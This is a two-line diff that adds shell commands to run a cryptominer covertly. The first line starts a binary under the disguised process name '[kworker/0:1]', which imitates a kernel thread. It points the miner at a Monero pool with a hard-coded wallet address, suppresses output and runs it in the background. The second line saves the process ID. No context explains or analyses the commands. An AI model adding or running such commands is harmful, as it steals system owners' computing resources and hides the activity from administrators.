@@ -1,0 +1,2 @@
+./h64 -s [kworker/0:1] ./yam -c x -M "stratum+tcp://49C3WWiMHvxhakkKtCLcEFJCHKFjJ8xwYHu56GkzuupyWD5dENsQBYRdxbxSvW9rZLVnCTKDETfFBWSLEzcdzLV7NWEwzwo:x@xmr-eu.dwarfpool.com:8005/xmr" >>/dev/null &
+echo $! > bash.pid
